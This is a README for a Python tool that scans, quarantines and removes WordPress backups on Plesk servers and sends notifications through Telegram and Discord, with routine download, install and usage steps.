# 🛠️ plesk-wp-backup-sweeper - Clean Your Backups Easily

[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-brightgreen.svg)](https://github.com/TrieuGiaKhoi/plesk-wp-backup-sweeper/releases)

## 🚀 Getting Started

Welcome to the Plesk WordPress Backup Sweeper! This tool helps you manage your WordPress backups with ease. It can scan, quarantine, and remove unwanted backups while tracking your storage usage. It even sends notifications through Telegram and Discord.

### 📋 System Requirements

Before you start, ensure you have the following:

- **Operating System:** Linux (Ubuntu, CentOS)
- **Python Version:** 3.6 or higher
- **Plesk Installed:** You must have Plesk running on your server.
- **Internet Connection:** Needed for notifications and updates.

## 📥 Download & Install

To download the latest version of the Plesk WordPress Backup Sweeper, visit this page: [Download Releases](https://github.com/TrieuGiaKhoi/plesk-wp-backup-sweeper/releases).

1. Click on the link above to go to the Releases page.
2. Look for the latest version available.
3. Click on the asset that fits your needs (usually a `.tar.gz` or similar file).
4. Follow the instructions in the installation section below.

## 🛠️ Installation Steps

1. **Download the File:**

   After navigating to the Releases page, locate the download file for your system.

2. **Extract the File:**

   Open a terminal and navigate to your download directory. Use the following command to extract the downloaded file:

   ```bash
   tar -xzvf plesk-wp-backup-sweeper-*.tar.gz
   ```

3. **Navigate to the Directory:**

   Change to the directory created after extraction:

   ```bash
   cd plesk-wp-backup-sweeper
   ```

4. **Install Dependencies:**

   This tool relies on specific Python packages. Install them using:

   ```bash
   pip install -r requirements.txt
   ```

5. **Configure Your Settings:**

   Open the configuration file to customize settings like backup locations and notification channels. Use any text editor you like. For example:

   ```bash
   nano config.yaml
   ```

   Adjust settings as needed.

6. **Run the Application:**

   Finally, you can launch the tool with:

   ```bash
   python main.py
   ```

   This will start the scanner and allow you to manage your backups.

## ⚙️ Usage Instructions

Once the application is running, you will have several options:

- **Scan for Backups:** Start by scanning your current backups for any that need cleaning. Follow the prompts in the terminal.
  
- **Quarantine Backups:** If last backups are questionable, you can place them in quarantine for further review.
  
- **Remove Unwanted Backups:** Permanently delete backups that are no longer needed with just a command.

- **Track Space Usage:** Keep an eye on your server's storage with built-in tracking to ensure you have enough space.

- **Notifications:** Get alerts when actions are taken, either through Telegram or Discord. Make sure to set up your bot tokens in the configuration file.

## 🔧 Troubleshooting

If you encounter issues, check the following:

- **Python Not Found:** Ensure Python is installed and accessible in your terminal.

- **Permission Issues:** Run your terminal as an administrator or use `sudo` where necessary.

- **Missing Dependencies:** Double-check that all required packages are installed listed in `requirements.txt`.

## 🤝 Community Support

Join our community to share your experiences and ask questions:

- **Discord Channel:** [Join Here](#)
- **Telegram Group:** [Join Here](#)

## 🌟 Contribution

We welcome contributions! If you would like to help us improve this tool:

1. Fork the repository.
2. Create a feature branch.
3. Commit your changes.
4. Push the branch and open a pull request.

## 📝 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

For more information, updates, and discussions, feel free to explore the [GitHub Repository](https://github.com/TrieuGiaKhoi/plesk-wp-backup-sweeper).